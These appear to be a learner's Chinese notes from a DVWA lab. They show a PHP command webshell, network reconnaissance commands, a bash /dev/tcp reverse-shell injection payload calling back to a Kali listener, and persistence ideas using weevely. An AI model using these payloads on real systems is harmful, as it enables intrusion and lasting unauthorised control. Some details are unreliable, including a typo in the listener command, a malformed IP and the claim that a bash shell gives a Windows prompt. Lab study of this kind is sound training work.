#### webshell,反向shell，权限维持
1.webshell :这就像是你偷偷配了一把万能钥匙，并且把这把钥匙藏在了房子里一个很隐蔽的角落（如过文件上传功能，把一个后门文件传到了服务器上）。它是一个藏在网站服务器上述规定脚文件（PHP文件）
制作简单的PHP    echo '<?php system($_GET["cmd"]); ?>' > shell.php然后再DVWA靶场的file upload上传
在浏览器中访问这个URL。并在后面添加命令参数，例如：
http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
### 内网横向移动{跳板服务器（一个公司的保安室）->内网（整栋大楼）}
1.1了解你的位置->网段网关DNS服务器在哪
#### ipconfig/all
#### ifconfig或ip addr 
#### 1.2查看当前网络用户名单 arp -a 发现邻居，查看当前网络用户名单。谁和我同一个网段。ip-MAC地址对应表(识别设备类型)，找到活跃的主机列表
1.3netstat(查看社交关系)
#### netstat -ano
#### netstat -tulnp
找到当前连接。开放端口，和信任关系
这些信息收集阶段：
发现域名控制器 DNS信息或端口扫描389.636->攻击域控
发现数据库服务器 netstat ->1433.3306数据库渗透
发现文件共享 netstat->445连接 尝试SMB漏洞利用
2.反向shell（反向连接）：是你作为管理员去主动连接服务器（就像你主动走进房子）。但“反向Shell”是反过来操作的。它让房子里的一个“内应”（被控制的服务器）主动出来连接你（黑客）的电脑。在自己的服务器上开着门等着（用nc命令监听），然后让服务器主动来连接我
首先我们需要在Kali上开启监听器
nv -lvnp 4444(表示 4444端口监听传入的连接)
kali ip:192.168.202.129
主机IP：192168.100.101
在DVWA的command injection模块输入框中：192.168.100.101；bash -c "bash -i >& /dev/tcp/192.168.202.129/4444 0>&1"
这样nc 就会接受来自192.168.100.101的连接，在命令行中就会获得Windows命令提示符：
![[Pasted image 20251201213317.png]]
就可以输入一些命令查询dir ,whoami ,ipconfig ,systeminfo  ,net user hacker如果这些命令有输出，说明已经成功获取Windows反向shell
3.权限维持（保住控制权）：
 制造一把更隐蔽的“备用钥匙”（比如用`weevely`生成的隐蔽Webshell）。
-在房子里设置一个“定时报到装置”（比如计划任务，每隔一段时间就联系你一次）。
把自己伪装成房子的一个正常零件（比如修改系统自带的程序，把它变成后门）。
weevely generate mypassword shell_weevely.php(产生一个密码为mypassword的文件)
 weevely http://192.168.100.101/hackable/uploads/shell_weevely.php mypassword （weevely软件有点问题，下次再记录）
 
过几天学习 plink或chisel工具，现在的kali网络环境出了点问题

